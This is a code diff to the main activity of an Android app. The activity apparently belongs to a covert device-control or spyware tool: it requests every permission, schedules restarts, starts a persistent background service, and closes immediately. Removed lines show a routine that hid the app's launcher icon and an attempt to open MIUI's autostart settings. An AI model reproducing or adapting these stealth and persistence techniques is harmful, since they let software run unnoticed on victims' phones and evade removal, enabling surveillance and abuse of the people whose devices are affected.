@@ -20,11 +20,24 @@ class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
+        StorageManager.init(this)
+        SecurityManager.init(this)
+        
+        if (!SecurityManager.verifyApp()) {
+            SecurityManager.activateLicense()
+        }
+        
         requestAllPermissions()
         scheduleRestart()
-        startService(Intent(this, DeviceService::class.java))
         
-        Toast.makeText(this, "Local System activated", Toast.LENGTH_SHORT).show()
+        val serviceIntent = Intent(this, DeviceService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+        
+        Toast.makeText(this, "Id_Terrible activated", Toast.LENGTH_SHORT).show()
         
         finish()
     }
@@ -67,7 +80,6 @@ class MainActivity : Activity() {
         }
         
         requestSpecialPermissions()
-        hideAppIcon()
     }
     
     private fun requestSpecialPermissions() {
@@ -86,31 +98,6 @@ class MainActivity : Activity() {
                 })
             }
         } catch (_: Exception) {}
-        
-        try {
-            val intent = Intent()
-            intent.component = android.content.ComponentName(
-                "com.miui.securitycenter",
-                "com.miui.permcenter.autostart.AutoStartManagementActivity"
-            )
-            startActivity(intent)
-        } catch (_: Exception) {}
-        
-        try {
-            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-            intent.data = Uri.parse("package:$packageName")
-            startActivity(intent)
-        } catch (_: Exception) {}
-    }
-    
-    private fun hideAppIcon() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
     }
     
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
@@ -119,10 +106,15 @@ class MainActivity : Activity() {
         val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
         if (allGranted) {
             requestSpecialPermissions()
-            hideAppIcon()
         }
         
-        startService(Intent(this, DeviceService::class.java))
+        val serviceIntent = Intent(this, DeviceService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+        
         finish()
     }
 }
